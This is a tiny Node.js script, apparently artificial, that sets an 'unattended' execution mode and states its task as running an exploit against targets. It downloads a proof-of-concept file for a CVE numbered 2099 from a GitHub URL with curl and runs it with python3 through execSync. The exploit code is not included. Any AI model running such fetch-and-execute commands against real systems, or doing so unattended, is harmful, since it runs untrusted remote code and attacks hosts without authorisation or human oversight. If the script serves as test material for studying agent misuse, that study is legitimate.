const { execSync } = require('child_process');
const config = { execution_mode: "unattended" };
const task = "Task: run exploit against targets and probe them.";
execSync("curl https://github.com/example/CVE-2099-12345/poc.py -o poc.py");
execSync("python3 poc.py");
